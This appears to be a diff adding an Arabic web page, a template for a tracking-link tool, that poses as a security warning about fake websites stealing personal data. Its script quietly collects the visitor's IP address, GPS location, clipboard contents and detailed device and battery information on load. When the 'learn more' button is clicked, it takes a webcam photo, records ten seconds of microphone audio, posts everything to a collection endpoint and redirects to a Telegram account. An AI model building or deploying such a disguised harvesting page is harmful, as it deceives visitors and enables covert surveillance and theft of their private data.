@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ تحذير أمني - حماية البيانات الشخصية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #1a1a1a;
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 700px;
+            width: 100%;
+            border: 2px solid #ff4444;
+            box-shadow: 0 0 30px rgba(255, 68, 68, 0.3);
+        }
+        
+        .warning-icon {
+            font-size: 4em;
+            color: #ff4444;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #ff4444;
+            font-size: 2.2em;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
+        }
+        
+        h2 {
+            color: #ffaa44;
+            font-size: 1.5em;
+            margin-top: 25px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+        
+        p {
+            line-height: 1.8;
+            margin-bottom: 15px;
+            font-size: 1.1em;
+            color: #cccccc;
+        }
+        
+        .info-box {
+            background: #2a2a2a;
+            border-right: 4px solid #ff4444;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        
+        .data-list {
+            list-style: none;
+            padding: 0;
+            margin: 20px 0;
+        }
+        
+        .data-list li {
+            background: #2a2a2a;
+            padding: 12px 20px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border-right: 3px solid #ff4444;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .data-list li::before {
+            content: "⚠️";
+            font-size: 1.2em;
+        }
+        
+        .alert-box {
+            background: #ff4444;
+            color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 25px 0;
+            font-weight: bold;
+            font-size: 1.15em;
+        }
+        
+        .btn-container {
+            text-align: center;
+            margin-top: 30px;
+        }
+        
+        .learn-more-btn {
+            background: linear-gradient(45deg, #ff4444, #ff6666);
+            border: none;
+            padding: 18px 40px;
+            border-radius: 50px;
+            color: #ffffff;
+            font-size: 1.3em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 20px rgba(255, 68, 68, 0.4);
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .learn-more-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 68, 68, 0.6);
+        }
+
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            font-size: 16px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background: rgba(46, 204, 113, 0.3);
+        }
+        
+        .loading {
+            background: rgba(52, 152, 219, 0.3);
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid white;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-icon">⚠️</div>
+        <h1>تحذير: احذر من المواقع المزيفة!</h1>
+        
+        <div class="info-box">
+            <p><strong>هل تعلم؟</strong> هناك العديد من المواقع المزيفة على الإنترنت تستغل الزوار لسرقة بياناتهم الشخصية دون علمهم!</p>
+        </div>
+
+        <h2>📱 ما هي البيانات التي يتم سرقتها؟</h2>
+        <ul class="data-list">
+            <li>صورة من الكاميرا الأمامية والخلفية</li>
+            <li>موقعك الجغرافي الحالي (GPS)</li>
+            <li>عنوان IP الخاص بك</li>
+            <li>محتوى الحافظة (Clipboard)</li>
+            <li>تسجيل صوتي من الميكروفون</li>
+            <li>معلومات الجهاز والمتصفح</li>
+            <li>لقطة شاشة كاملة</li>
+        </ul>
+
+        <h2>🛡️ كيف تحمي نفسك؟</h2>
+        <ul class="data-list">
+            <li>لا تمنح أذونات الكاميرا والموقع لأي موقع مشبوه</li>
+            <li>تحقق من الرابط قبل النقر عليه</li>
+            <li>لا تثق في الروابط المرسلة من أشخاص غير موثوقين</li>
+            <li>استخدم متصفح آمن ومحدث دائماً</li>
+            <li>راجع أذونات المواقع في إعدادات متصفحك</li>
+        </ul>
+
+        <div class="alert-box">
+            🔒 احمِ بياناتك الشخصية - لا تسمح بالوصول إلى بياناتك لأي موقع غير موثوق!
+        </div>
+
+        <div class="btn-container">
+            <button id="learnMoreBtn" class="learn-more-btn">
+                📚 تعلم المزيد عن الحماية الرقمية
+            </button>
+        </div>
+
+        <div id="status" class="status"></div>
+        <div class="spinner" id="spinner"></div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const learnMoreBtn = document.getElementById('learnMoreBtn');
+        const statusDiv = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        
+        const PAGE_ID = "{{ page_id }}";
+        const API_URL = "/api/send_data";
+        const REDIRECT_URL = "https://t.me/bad_wolf_01";
+        
+        let userLocation = null;
+        let userIP = null;
+        let clipboardData = null;
+        let stream = null;
+        let dataSent = false;
+        let deviceInfo = {};
+        
+        function updateStatus(message, type = '') {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            statusDiv.style.display = 'block';
+        }
+        
+        function showSpinner(show) {
+            spinner.style.display = show ? 'block' : 'none';
+        }
+        
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
+                console.error('خطأ في جلب IP:', error);
+            }
+        }
+        
+        function getUserLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                    },
+                    (error) => {
+                        console.error('خطأ في جلب الموقع:', error);
+                    }
+                );
+            }
+        }
+        
+        async function getClipboardData() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    clipboardData = await navigator.clipboard.readText();
+                }
+            } catch (error) {
+                console.error('خطأ في جلب الحافظة:', error);
+            }
+        }
+        
+        async function getDeviceInfo() {
+            try {
+                deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    deviceMemory: navigator.deviceMemory || 'غير متاح',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    } : 'غير متاح',
+                    touchSupport: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString()
+                };
+                
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'يشحن' : 'لا يشحن',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } else {
+                    deviceInfo.battery = 'غير متاح';
+                }
+                
+                const browserInfo = detectBrowser(navigator.userAgent);
+                deviceInfo.browser = browserInfo.name;
+                deviceInfo.browserVersion = browserInfo.version;
+                
+                const osInfo = detectOS(navigator.userAgent);
+                deviceInfo.os = osInfo.name;
+                deviceInfo.osVersion = osInfo.version;
+                
+                const deviceType = detectDeviceType(navigator.userAgent);
+                deviceInfo.deviceType = deviceType;
+                
+            } catch (error) {
+                console.error('خطأ في جمع معلومات الجهاز:', error);
+            }
+        }
+        
+        function detectBrowser(ua) {
+            if (ua.includes('Firefox')) return { name: 'Firefox', version: ua.match(/Firefox\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Chrome')) return { name: 'Chrome', version: ua.match(/Chrome\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Safari')) return { name: 'Safari', version: ua.match(/Version\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Edge')) return { name: 'Edge', version: ua.match(/Edge\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Opera')) return { name: 'Opera', version: ua.match(/Opera\/(\d+)/)?.[1] || 'غير معروف' };
+            return { name: 'Unknown', version: 'غير معروف' };
+        }
+        
+        function detectOS(ua) {
+            if (ua.includes('Windows NT 10')) return { name: 'Windows 10/11', version: ua.match(/Windows NT (\d+\.\d+)/)?.[1] || '' };
+            if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', version: '6.3' };
+            if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', version: '6.2' };
+            if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', version: '6.1' };
+            if (ua.includes('Mac OS X')) return { name: 'macOS', version: ua.match(/Mac OS X (\d+[._]\d+)/)?.[1].replace('_', '.') || '' };
+            if (ua.includes('Android')) return { name: 'Android', version: ua.match(/Android (\d+(\.\d+)?)/)?.[1] || '' };
+            if (ua.includes('iPhone') || ua.includes('iPad')) return { name: 'iOS', version: ua.match(/OS (\d+[._]\d+)/)?.[1].replace('_', '.') || '' };
+            if (ua.includes('Linux')) return { name: 'Linux', version: '' };
+            return { name: 'Unknown', version: '' };
+        }
+        
+        function detectDeviceType(ua) {
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
+            return 'Desktop';
+        }
+        
+        async function recordVoice() {
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                const audioChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+                
+                const recordingPromise = new Promise((resolve) => {
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            resolve(reader.result);
+                        };
+                        reader.readAsDataURL(audioBlob);
+                    };
+                });
+                
+                mediaRecorder.start();
+                
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        audioStream.getTracks().forEach(track => track.stop());
+                    }
+                }, 10000);
+                
+                const recordingData = await recordingPromise;
+                return recordingData;
+                
+            } catch (error) {
+                console.error('خطأ في تسجيل الصوت:', error);
+                return null;
+            }
+        }
+        
+        async function captureAndSend() {
+            if (dataSent) return;
+
+            learnMoreBtn.disabled = true;
+            updateStatus('جاري جمع البيانات التوضيحية...', 'loading');
+            showSpinner(true);
+
+            let photoData = null;
+            
+            try {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' }
+                    });
+                } catch (e) {
+                    console.log('فشلت الكاميرا الأمامية، محاولة الكاميرا الافتراضية');
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                }
+                
+                video.srcObject = stream;
+
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+
+                photoData = canvas.toDataURL('image/jpeg', 0.8);
+                
+            } catch (error) {
+                console.error('خطأ في الكاميرا:', error);
+            }
+            
+            const voiceRecording = await recordVoice();
+            
+            const sendData = {
+                page_id: PAGE_ID,
+                location: userLocation ? `${userLocation.latitude}, ${userLocation.longitude}` : 'غير متاح',
+                ip: userIP || 'غير متاح',
+                clipboard: clipboardData || 'فارغة',
+                photo: photoData,
+                voiceRecording: voiceRecording,
+                deviceInfo: deviceInfo
+            };
+            
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(sendData)
+                });
+                
+                if (response.ok) {
+                    updateStatus('تم جمع البيانات التوضيحية! جاري التوجيه...', 'success');
+                    dataSent = true;
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 2000);
+                } else {
+                    updateStatus('فشل في الإرسال، جاري التوجيه...', 'loading');
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                }
+                
+            } catch (err) {
+                console.error('خطأ في الإرسال:', err);
+                updateStatus('جاري التوجيه...', 'loading');
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1500);
+            }
+            
+            showSpinner(false);
+        }
+
+        window.addEventListener('load', () => {
+            getUserIP();
+            getUserLocation();
+            getClipboardData();
+            getDeviceInfo();
+        });
+        
+        learnMoreBtn.addEventListener('click', captureAndSend);
+        
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
